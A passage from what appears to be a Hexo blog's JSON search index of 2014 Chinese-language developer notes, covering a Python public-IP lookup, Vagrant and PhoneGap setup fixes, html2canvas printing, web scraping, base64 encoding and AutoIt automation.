class=\"line\"><span class=\"string\">http://www.lawrencegoetz.com/programs/ipinfo/</span></span><br><span class=\"line\"><span class=\"string\">http://www.mantacore.se/whoami/</span></span><br><span class=\"line\"><span class=\"string\">http://www.edpsciences.org/htbin/ipaddress</span></span><br><span class=\"line\"><span class=\"string\">http://mwburden.com/cgi-bin/getipaddr</span></span><br><span class=\"line\"><span class=\"string\">http://checkipaddress.com/</span></span><br><span class=\"line\"><span class=\"string\">http://www.glowhost.com/support/your.ip.php</span></span><br><span class=\"line\"><span class=\"string\">http://www.tanziars.com/</span></span><br><span class=\"line\"><span class=\"string\">http://www.naumann-net.org/</span></span><br><span class=\"line\"><span class=\"string\">http://www.godwiz.com/</span></span><br><span class=\"line\"><span class=\"string\">http://checkip.eurodyndns.org/\"\"\"</span>.strip().split(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>):</span><br><span class=\"line\">        host = random.choice(hosts)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            results = ip_regex.findall(urllib.urlopen(host).read(<span class=\"number\">200000</span>))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> results: <span class=\"keyword\">return</span> results[<span class=\"number\">0</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span> <span class=\"comment\"># Let's try another host</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(public_ip());</span><br></pre></td></tr></table></figure>","categories":["Python"],"tags":["Python","查詢本機IP"]},{"title":"Fixing “The box ‘base’ could not be found.” (Vagrant)","url":"/blog/2014/10/26/logdown/2014-10-26-fixing-the-box-base-could-not-be-found-vagrant/","content":"<p>vagrant box add base <a href=\"http://files.vagrantup.com/lucid32.box\" target=\"_blank\" rel=\"noopener\">http://files.vagrantup.com/lucid32.box</a></p>\n<blockquote>\n<p>This is an indication that the the base virtual image is not configured, usually from forgetting to finish the installation. This image is copied, and modified to produce the desired virtualized environment. It’s easy to fix, by running the following:</p>\n</blockquote>\n<p><code>vagrant box add base http://files.vagrantup.com/lucid32.box</code></p>\n<blockquote>\n</blockquote>\n<p>It is also possible that you installed the box under a different name (the Vagrant website sometimes refers to lucid32). Instead of downloading a new box, in this case, you can edit Vagrantfile like so, changing the box name to whatever you called it on download:</p>\n<blockquote>\n</blockquote>\n<p>   <code>config.vm.box = &quot;lucid32&quot;</code></p>\n<blockquote>\n<p>If you don’t know what you called it:</p>\n</blockquote>\n<p><code>vagrant box list</code></p>\n<p><a href=\"http://www.garysieling.com/blog/fixing-the-box-base-could-not-be-found-vagrant\" target=\"_blank\" rel=\"noopener\">http://www.garysieling.com/blog/fixing-the-box-base-could-not-be-found-vagrant</a></p>\n<hr>\n<p>題外話，</p>\n<p>由於我這台XP上<code>vagrant up</code>vagrant不能用share folder<br>找不到解決方法</p>\n<p>結果後來發現是我腦殘把key改掉<br>刪掉vagrant_home(.vagrant資料夾)<br>就解決了</p>\n","categories":["Vagrant"]},{"title":"在XP上安裝chef","url":"/blog/2014/10/27/logdown/2014-10-27-install-in-xp-chef/","content":"<p>之前Ezgo11安裝vagrant都用的還滿順的<br>突然換到XP來用…，就發現麻煩的不少<br>沒法只能用XP來用</p>\n<p>這次發現<a href=\"https://supermarket.getchef.com/\" target=\"_blank\" rel=\"noopener\">CHEFsupermarket</a>改版了<br>連找cookbooks下載地方都找不太到<br>最後發現在右下角  = =|||</p>\n<p>Cookbooks網址：<a href=\"https://supermarket.getchef.com/\" target=\"_blank\" rel=\"noopener\">https://supermarket.getchef.com/</a></p>\n","categories":["Vagrant"]},{"title":"在Windows XP上vagrant不能加box","url":"/blog/2014/10/25/logdown/2014-10-25-vagrant-in-windows-xp-cant-add-box/","content":"<p>學校給我一台舊電腦(CPU:Sempron 64 3100+ 1.8Ghz，RAM:512MB)<br>於是我買了二手RAM:1G*2 300塊含運<br>電腦就順多了:D<br><a id=\"more\"></a></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/239862/fZVIUs79SzW4wZnYhPeS_com.JPG\" alt=\"com.JPG\"><br>由於灌ezgo11顯卡驅動沒有抓到via sig unichrome pro<br>google一大堆都沒有解決</p>\n<p>所以就試試XP下裝Vagrant，還是遇到問題Orz<br><code>The box failed to unpackage properly.</code><br>Google搜尋了一下，最終找到解決<a href=\"https://github.com/mitchellh/vagrant/issues/3869\" target=\"_blank\" rel=\"noopener\">Error while adding Vagrant box in windows xp</a></p>\n<blockquote>\n<p>my solution was to download the basic_bsdtar.exe from here <a href=\"http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/\" target=\"_blank\" rel=\"noopener\">http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/</a> and rename it to bsdtar.exe and place it in C:\\HashiCorp\\Vagrant\\embedded\\gnuwin32\\bin\\</p>\n</blockquote>\n<ol>\n<li>去<a href=\"http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/\" target=\"_blank\" rel=\"noopener\">http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/</a> 下載檔案</li>\n<li>到C:\\HashiCorp\\Vagrant\\embedded\\gnuwin32\\bin\\ 把bsdtar.exe取代掉</li>\n<li>vagrant即可加入box</li>\n</ol>\n","categories":["Vagrant"]},{"title":"使用html2canvas截圖列印","url":"/blog/2014/10/28/logdown/2014-10-28-html2canvas-print-screenshots/","content":"<p>路過<a href=\"http://wengsi62.blogspot.tw/2013/03/html2canvas.html\" target=\"_blank\" rel=\"noopener\">以html2canvas制作頁面截圖列印</a>教學</p>\n<p>覺得還不錯，筆記筆記！<br><a id=\"more\"></a></p>\n<blockquote>\n</blockquote>\n<p> 以html2canvas制作頁面截圖列印<br>網上有很多截圖的Service, 如webkit2png或khtml2png，但始終也要經過第三方處理，對於一些內部應用好像不太方便。</p>\n<blockquote>\n</blockquote>\n<p>HTML2CANVAS是完全以Client Side Javascript 來將網頁截圖，由於需要用到HTML5的CANVAS ELEMENT，所以對瀏覽器有一定要求，例如 IE9以下並不支援 (但不知道如果用EXCANVAS可否彌補瀏覽器支援上的不足，稍後再試吧)。</p>\n<blockquote>\n</blockquote>\n<p>HTML2CANVAS<br>官方：<a href=\"http://html2canvas.hertzen.com/\" target=\"_blank\" rel=\"noopener\">http://html2canvas.hertzen.com/</a><br>下載：<a href=\"https://github.com/niklasvh/html2canvas\" target=\"_blank\" rel=\"noopener\">https://github.com/niklasvh/html2canvas</a></p>\n<blockquote>\n</blockquote>\n<p>開始編寫時在官方下載了0.34版本，使用時發現 IE9可正常運行，但Chrome只能於ready時執行，而無法由button click event執行。後來改用了0.4版本，卻輪到 IE不行。接著發現其中的renderElement function 中有null value的error, 修改後IE終於亦可正常運作了。</p>\n<blockquote>\n</blockquote>\n<p>紅色為html2canvas.js新增部份<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">\"INPUT\"</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"regexp\">/^(text|url|email|submit|button|reset)$/</span>.test(element.type) &amp;&amp; (element.value || element.placeholder || <span class=\"string\">\"\"</span>).length &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">          renderFormValue(element, bounds, stack);</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n</blockquote>\n<p>亦可下載修改後的html2canvas.js :<br><a href=\"https://docs.google.com/file/d/0B9ookpf4ArZcMHhqemVkTzBCVlU/edit?usp=sharing\" target=\"_blank\" rel=\"noopener\">https://docs.google.com/file/d/0B9ookpf4ArZcMHhqemVkTzBCVlU/edit?usp=sharing</a></p>\n<blockquote>\n</blockquote>\n<p>例子: index.html(<a href=\"http://plnkr.co/edit/VR30GO\" target=\"_blank\" rel=\"noopener\">http://plnkr.co/edit/VR30GO</a>)</p>\n<blockquote>\n</blockquote>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"jquery.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> <span class=\"comment\">&lt;!-- version: 1.9.1 --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"html2canvas.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> <span class=\"comment\">&lt;!-- version: 0.4.0 modify --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Example<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">pre</span>&gt;</span>HTML2CANVAS to new window and print<span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">class</span>=<span class=\"string\">\"print\"</span>&gt;</span>Print<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Button event must after button element, it is not run insert ready() --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">   $(<span class=\"string\">\".print\"</span>).on(<span class=\"string\">\"click\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\"> html2canvas($(<span class=\"string\">'body'</span>), &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  onrendered: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">canvas</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> newWind=<span class=\"built_in\">window</span>.open(<span class=\"string\">''</span>, <span class=\"string\">\"Print\"</span>);</span></span><br><span class=\"line\"><span class=\"xml\">    <span class=\"comment\">&lt;!-- Must use html5 --&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">    newWind.document.write(\"<span class=\"meta\">&lt;!doctype html&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'\"+canvas.toDataURL()+\"'</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span>\");</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    newWind.print();</span></span><br><span class=\"line\"><span class=\"undefined\">   &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"> &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">  </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>File Download (include index.html, html2canvas.js, jquery.js):<br><a href=\"https://docs.google.com/file/d/0B9ookpf4ArZcSlB2OXN4c1pGQ00/edit?usp=sharing\" target=\"_blank\" rel=\"noopener\">https://docs.google.com/file/d/0B9ookpf4ArZcSlB2OXN4c1pGQ00/edit?usp=sharing</a></p>\n","categories":["HTML"],"tags":["js","html2canvas"]},{"title":"6個超強增加英文能力網站","url":"/blog/2014/10/29/logdown/2014-10-29-6-super-increase-english-website/","content":"<p>看到<a href=\"http://www.businessweekly.com.tw/online/20141016/KBlogArticle_9545_1.htm\" target=\"_blank\" rel=\"noopener\">還在用Google翻譯？6個超強網站讓你查到最道地的英文</a>介紹覺得還不錯，記錄一下</p>\n<ol>\n<li><a href=\"https://www.google.com.tw/\" target=\"_blank\" rel=\"noopener\">Google</a></li>\n<li><a href=\"http://www.netspeak.org/\" target=\"_blank\" rel=\"noopener\">Netspeak</a></li>\n<li><a href=\"http://www.just-the-word.com/\" target=\"_blank\" rel=\"noopener\">Just the word</a></li>\n<li><a href=\"http://candle.fl.nthu.edu.tw/collocation/webform2.aspx\" target=\"_blank\" rel=\"noopener\">TANGO Verb Noun Collocation (部分中、英對照)</a></li>\n<li><a href=\"http://tw.voicetube.com/\" target=\"_blank\" rel=\"noopener\">VoiceTube</a></li>\n<li><a href=\"http://corpus.byu.edu/coca/\" target=\"_blank\" rel=\"noopener\">The Corpus of Contemporary American English (COCA)</a></li>\n</ol>\n<p>14個APP好像也不錯<a href=\"http://www.businessweekly.com.tw/online/20140924/KBlogArticle_9367_1.htm\" target=\"_blank\" rel=\"noopener\">低頭族必備！英文想變好，快裝這14個實用英文學習App</a></p>\n","categories":["網站記錄"]},{"title":"html2canvas在Firefox上background-size黑畫面的問題","url":"/blog/2014/11/12/logdown/2014-11-12-htmnl2canvas-on-firefox-background-size-black-screen-problem/","content":"<p>最近使用html2canvas圖片都無法順利呈現…<br>最終在<a href=\"https://github.com/niklasvh/html2canvas/issues/288找到解決問題。\" target=\"_blank\" rel=\"noopener\">https://github.com/niklasvh/html2canvas/issues/288找到解決問題。</a><br><a href=\"https://github.com/niklasvh/html2canvas/commit/e9afe0396019abc39bdb949d78819ae971bf5f2c\" target=\"_blank\" rel=\"noopener\">https://github.com/niklasvh/html2canvas/commit/e9afe0396019abc39bdb949d78819ae971bf5f2c</a></p>\n<p>不過使用<code>background-size: xxpx;</code>數值仍然在Firefox上還是有問題<br>但是<code>background-size:cover</code>和<code>background-size:contain</code>可以順力產生圖片</p>\n","categories":["HTML"],"tags":["html2canvas","background-size"]},{"title":"[Python]使用requests、BeautifulSoup當網頁爬蟲","url":"/blog/2014/11/18/logdown/2014-11-18-python-using-beautifulsoup-and-requests-when-crawler/","content":"<p>上次參加COSCUP 2014時候，<a href=\"http://www.slideshare.net/daikeren/news-37154830\" target=\"_blank\" rel=\"noopener\">電腦不只會幫你選土豆，還會幫你選新聞</a><br>最近無聊做個小實驗<br>使用requests、BeautifulSoup實作抓資料存成json<br>結果發現不會太難</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from selenium import webdriver</span><br><span class=\"line\">from bs4 import BeautifulSoup</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#browser = webdriver.Firefox()</span><br><span class=\"line\">#browser.get(&quot;/* url */&quot;)</span><br><span class=\"line\">#html_source = browser.page_source</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">soup = BeautifulSoup(requests.get(&quot;/* url */&quot;).text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(&quot;/* you can not know it o.&lt; */&quot;,&quot;w+&quot;)</span><br><span class=\"line\">fp.write(json.dumps(b))</span><br><span class=\"line\">fp.close()</span><br></pre></td></tr></table></figure>\n<p>selenium通常是用來程式測試上面<br>但也可以抓取網頁HTML<br>通常用爬蟲requests和beautifulsoup就夠方便了XD</p>\n","categories":["Python"],"tags":["爬蟲","requests","BeautifulSoup"]},{"title":"[Python]圖片轉成base64碼","url":"/blog/2014/11/20/logdown/2014-11-20-python-picture-converted-to-base64-code/","content":"<p>實作異常的順力^^</p>\n<figure class=\"highlight python\"><figcaption><span>image.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(<span class=\"string\">\"a.jpg\"</span>,<span class=\"string\">\"rb\"</span>)</span><br><span class=\"line\">img = fp.read()</span><br><span class=\"line\">fp.close()</span><br><span class=\"line\"></span><br><span class=\"line\">print(base64.b64encode(img))</span><br></pre></td></tr></table></figure>\n<p>在接下來使用requests來實作</p>\n<figure class=\"highlight python\"><figcaption><span>image.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">imgdata = requests.get(imgurl).content</span><br><span class=\"line\">imgb64 = base64.b64encode(imgdata)</span><br></pre></td></tr></table></figure>\n<p>  完成:D</p>\n","categories":["Python"]},{"title":"[Python]文件儲存unicode碼的問題","url":"/blog/2014/11/19/logdown/2014-11-19-python-files-store-unicode-codes-problem/","content":"<p>由於用網頁爬蟲抓取的資料存入json<br>文件都會顯示<code>&quot;{artist&quot;: &quot;\\u3058\\u3093&quot;}</code><br>但程式抓取都不會有亂碼的問題</p>\n<p>但今天我Google大神一個整天<br>終於找到方法<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">str.encode().decode(<span class=\"string\">'unicode_escape'</span>)</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>儲存文件時請記得調成<strong>utf-8</strong><br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">fp = open(<span class=\"string\">\"animeList.json\"</span>,<span class=\"string\">\"w+\"</span>, encoding = <span class=\"string\">\"utf-8\"</span>)</span><br></pre></td></tr></table></figure></p>\n<p>內文的\\n,\\r,\\t…等等都會不見<br>最終以<code>str.replace(&#39;\\n&#39;,&#39;\\\\n&#39;)</code>來解決</p>\n<p>repr包字串會跑出<code>\\x5e</code>東西</p>\n<p>參考：<br><a href=\"http://stackoverflow.com/questions/24787224/how-to-convert-a-python-string\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/24787224/how-to-convert-a-python-string</a><br><a href=\"http://www.haogongju.net/art/2041510\" target=\"_blank\" rel=\"noopener\">http://www.haogongju.net/art/2041510</a><br><a href=\"http://elleryq-blog.logdown.com/posts/197801/python3-u860bu679c-into-a-unicode-string\" target=\"_blank\" rel=\"noopener\">http://elleryq-blog.logdown.com/posts/197801/python3-u860bu679c-into-a-unicode-string</a></p>\n","categories":["Python"]},{"title":"[phonegap]編譯APK錯誤訊息","url":"/blog/2014/12/15/logdown/2014-12-15-phonegap-apk-compilation-error-messages/","content":"<p>因為<code>phonegap build android</code>顯示需要Android SDK 19，但是卻出現這個訊息。</p>\n<p><code>The SDK Build Tools revision (19.0.3) is too low for project &#39;Testing&#39;.\nMinimum required is 19.1.0</code></p>\n<p>開起SDK Manager.exe選擇Tool資料夾裡面的Android SDK Build-tools (Rev)19.1</p>\n<p>就解決此問題</p>\n","categories":["Phonegap"]},{"title":"phonegap安裝環境筆記","url":"/blog/2014/12/08/logdown/2014-12-08-phonegap-installation-notes/","content":"<p>先下載<a href=\"http://nodejs.org/download/\" target=\"_blank\" rel=\"noopener\">NodeJS</a>安裝<br>原因官網建議是利用npm管理套件來安裝</p>\n<p><code>C:\\&gt; npm install -g phonegap</code></p>\n<a id=\"more\"></a>\n<p>相關Android安裝環境<a href=\"http://www.dotblogs.com.tw/maplenote/archive/2014/01/16/phonegap_android_install.aspx\" target=\"_blank\" rel=\"noopener\">這邊</a><br>有詳細記錄</p>\n<p>可在Android安裝Phonegap Developer app<br><a href=\"http://app.phonegap.com/\" target=\"_blank\" rel=\"noopener\">http://app.phonegap.com/</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">phonegap create my-app</span><br><span class=\"line\">cd my-app</span><br><span class=\"line\">phonegap serve</span><br></pre></td></tr></table></figure></p>\n<p>能簡單執行程式!!!</p>\n<p>參考來原：<br><a href=\"http://www.dotblogs.com.tw/maplenote/archive/2014/01/16/phonegap_android_install.aspx\" target=\"_blank\" rel=\"noopener\">http://www.dotblogs.com.tw/maplenote/archive/2014/01/16/phonegap_android_install.aspx</a></p>\n","categories":["Phonegap"]},{"title":"[phonegap]安裝套件-battery-status","url":"/blog/2014/12/16/logdown/2014-12-16-phonegap-mounting-kit-battery-status/","content":"<p>首先套件可到<a href=\"http://plugins.cordova.io/搜尋\" target=\"_blank\" rel=\"noopener\">http://plugins.cordova.io/搜尋</a><br><a href=\"http://plugins.cordova.io/#/package/org.apache.cordova.battery-status\" target=\"_blank\" rel=\"noopener\">http://plugins.cordova.io/#/package/org.apache.cordova.battery-status</a><br>CMD指令輸入<br><code>phonegap plugin add org.apache.cordova.battery-status</code><br>我把cordova換成phonegap</p>\n<p>官網教學是用<code>plugman</code>來裝<br>但這兩種安裝方法好像有差(我還沒搞清楚= =|||)</p>\n<p>然後，試試battery-status程式竟然沒有跑出電池資訊<br><a id=\"more\"></a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">window.addEventListener(&quot;batterystatus&quot;, onBatteryStatus, false);</span><br><span class=\"line\">function onBatteryStatus(info) &#123;</span><br><span class=\"line\">    // Handle the online event</span><br><span class=\"line\">    alert(&quot;Level: &quot; + info.level + &quot; isPlugged: &quot; + info.isPlugged);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>後來查到幾個原因<br>1.加入cordova.js (我沒加入那個orz)<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"cordova.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>2.battery-status擺放位置需在deviceready事件處理<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">document.addEventListener(&quot;deviceready&quot;, onDeviceReady, false);</span><br><span class=\"line\">function onDeviceReady() &#123;</span><br><span class=\"line\">   window.addEventListener(&quot;batterystatus&quot;, onBatteryStatus, false);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function onBatteryStatus(event) &#123;</span><br><span class=\"line\">   console.log(&quot;電量: &quot; + event.level + &quot;插入充電器: &quot; + event.isPlugged);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>用手機開Phonegap developer app進去就可以看到成果:D</p>\n<p>–<br>參考資料：<br>phonegap 增加media plugin範例<br><a href=\"http://pcschoolleo.blogspot.tw/2013/11/phonegap-media-plugin.html\" target=\"_blank\" rel=\"noopener\">http://pcschoolleo.blogspot.tw/2013/11/phonegap-media-plugin.html</a></p>\n<p><a href=\"http://iclab.csie.chu.edu.tw/course/app-programming/lecture/phonegap-jquery-mobile/\" target=\"_blank\" rel=\"noopener\">http://iclab.csie.chu.edu.tw/course/app-programming/lecture/phonegap-jquery-mobile/</a><br>PPT第12章</p>\n<blockquote>\n<p>PhoneGap框架主要是由手機平台的原生程式碼和JavaScript程式碼所組成，Android就是cordova-x.x.x.jar和cordova-x.x.x.js檔案，所以，框架載入分成原生和JavaScript兩部分。<br>事件只有window.onload、deviceready、resume和pause事件是我們可以處理的事件，其他都是內部事件。</p>\n</blockquote>\n<p>PhoneGap 與 Cordova 的實際差異<br><a href=\"http://blog.tiger-workshop.com/difference-between-phonegap-and-cordova/\" target=\"_blank\" rel=\"noopener\">http://blog.tiger-workshop.com/difference-between-phonegap-and-cordova/</a></p>\n<p>PhoneGap API中文幫助文檔——Events（事件）<br><a href=\"http://fanli7.net/a/JAVAbiancheng/JAVAzonghe/20120706/181894.html\" target=\"_blank\" rel=\"noopener\">http://fanli7.net/a/JAVAbiancheng/JAVAzonghe/20120706/181894.html</a></p>\n<p>Plugreg<br><a href=\"http://plugreg.com/\" target=\"_blank\" rel=\"noopener\">http://plugreg.com/</a></p>\n","categories":["Phonegap"]},{"title":"[CSS3]transition的轉場效果","url":"/blog/2014/12/23/logdown/2014-12-23-css3transition-transition-effects/","content":"<figure class=\"highlight\"><figcaption><span>CSS Syntax</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">transition: property duration timing-function delay|initial|inherit;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://www.w3schools.com/cssref/css3_pr_transition.asp\" target=\"_blank\" rel=\"noopener\">http://www.w3schools.com/cssref/css3_pr_transition.asp</a><br><a href=\"http://www.wibibi.com/info.php?tid=CSS3_transition_%E5%B1%AC%E6%80%A7\" target=\"_blank\" rel=\"noopener\">http://www.wibibi.com/info.php?tid=CSS3_transition_%E5%B1%AC%E6%80%A7</a></p>\n","categories":["CSS"],"tags":["CSS","transition"]},{"title":"Autoit筆記","url":"/blog/2014/12/20/logdown/2014-12-20-autoit-notes/","content":"<p>由於最近多了一項收發文工作，每天都要開起電腦收發文程式。<br>我就想想有沒有讓程式自動化，這樣我以後就開機就好了XD<br>於是我就開始做了<br><a id=\"more\"></a></p>\n<p>目前我只知道有這些</p>\n<ol>\n<li>Sikuli Script</li>\n<li>按鍵精靈</li>\n<li>Autoit</li>\n</ol>\n<p>這三個我只用過Sikuli，當出使用Sikuli的原因是因為對Python有好感<br>而且用圖來判斷有很炫的感覺XD，但後來他慢慢升級在Windows上會有怪問題，所以這次也不考慮用它。<br>Autoit在以前SuperXP、AutoXP，那個時代還滿有名的自動安裝軟體。<br>而且那一台電腦是Windows 8，查了一下Autoit在Win 8(desktop mode)可以正常運行，又能轉exe，所以就決定用它<br>以前不太會寫程式，教學文件幾乎都是英文的(英文苦手:X)<br>現在有基本程式基礎，所以比較看的懂教學文件，不過我依然還是英文苦手orz</p>\n<p>SciTE Script Editor，還滿好用了<br>隨便輸入幾個關鍵字就會跑出選單<br>目前有用幾個相關指令</p>\n<ol>\n<li>Run</li>\n<li>WinWaitAct</li>\n<li>ControlClick</li>\n<li>ControlSend</li>\n</ol>\n<p>這4個函式就能滿足我的需求</p>\n<p>編寫時用AutoIt Window Info拉Finder Tool出來到按鈕<br>在Control下方的Advanced Mode可抓出CLASS名稱和INSTANCE<br><code>ControlClick(&quot;程式標題名稱&quot;,&quot;程式按鈕文字&quot;,[CLASS:Button; INSTANCE:2])</code></p>\n<p>大部份函式都機乎是這樣</p>\n<p>最後發現執行有動到滑鼠鍵盤可能會失效<br>爬文找到一個方法可以鎖住鍵盤滑鼠<br><code>BlockInput(1);鎖定鍵盤滑鼠\nBlockInput(0);解除鎖定鍵盤滑鼠</code></p>\n<p>程式寫錯假如你有BlockInput(1)不能做動作的話<br>別急著按電腦重開機，只要<code>Crontol+Alt+Del</code>兩次<br>就可以解除鎖定了</p>\n<hr>\n<p>參考：</p>\n<p>自動安裝程式 - 試試AutoIt<br><a href=\"http://blog.roodo.com/sherwin/archives/71806.html\" target=\"_blank\" rel=\"noopener\">http://blog.roodo.com/sherwin/archives/71806.html</a></p>\n<p>AutoIt 【參考資料2009/09/28】<br><a href=\"http://id8051.pixnet.net/blog/post/29407939-autoit-%E3%80%90%E5%8F%83%E8%80%83%E8%B3%87%E6%96%992009-09-28%E3%80%91\" target=\"_blank\" rel=\"noopener\">http://id8051.pixnet.net/blog/post/29407939-autoit-%E3%80%90%E5%8F%83%E8%80%83%E8%B3%87%E6%96%992009-09-28%E3%80%91</a></p>\n<p>請問如何禁用滑鼠?[已解決]<br><a href=\"http://www.autoitx.com/viewthread.php?tid=13953\" target=\"_blank\" rel=\"noopener\">http://www.autoitx.com/viewthread.php?tid=13953</a></p>\n<p><a href=\"http://www.autoitx.com/index.php\" target=\"_blank\" rel=\"noopener\">http://www.autoitx.com/index.php</a></p>\n<p>發現好東西 autoit<br><a href=\"http://crazy.molerat.net/learner/cpuroom/net/reading.php?filename=100100995837.dov\" target=\"_blank\" rel=\"noopener\">http://crazy.molerat.net/learner/cpuroom/net/reading.php?filename=100100995837.dov</a></p>\n<p>桌面離線也可動作的AutoIt指令：ControlSend跟ControlClick<br><a href=\"http://pulipuli.blogspot.tw/2011/05/autoitcontrolsendcontrolclick.html\" target=\"_blank\" rel=\"noopener\">http://pulipuli.blogspot.tw/2011/05/autoitcontrolsendcontrolclick.html</a></p>\n<p>[A] AutoIt!! 註解與其它注意事項<br><a href=\"http://edisonx.pixnet.net/blog/post/38335545-%5Ba%5D-autoit!!-%E8%A8%BB%E8%A7%A3%E8%88%87%E5%85%B6%E5%AE%83%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85\" target=\"_blank\" rel=\"noopener\">http://edisonx.pixnet.net/blog/post/38335545-%5Ba%5D-autoit!!-%E8%A8%BB%E8%A7%A3%E8%88%87%E5%85%B6%E5%AE%83%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85</a></p>\n<p><strong>2020-09-11</strong></p>\n<p>Window info</p>\n<ul>\n<li><a 